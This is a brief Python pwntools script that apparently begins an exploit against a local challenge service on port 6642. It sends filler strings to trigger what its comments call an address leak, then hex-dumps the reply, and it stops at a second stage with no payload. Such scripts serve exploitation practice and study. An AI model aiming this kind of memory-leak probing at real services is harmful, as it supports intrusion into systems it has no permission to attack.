from pwn import *

p = remote("localhost", 6642)
#state1 leak addr
print(p.recv(200))
p.sendline("A"*32)

print(p.recv(200))
p.sendline("x"*32)

#state2
ret = p.recv(400)
print(hexdump(ret))
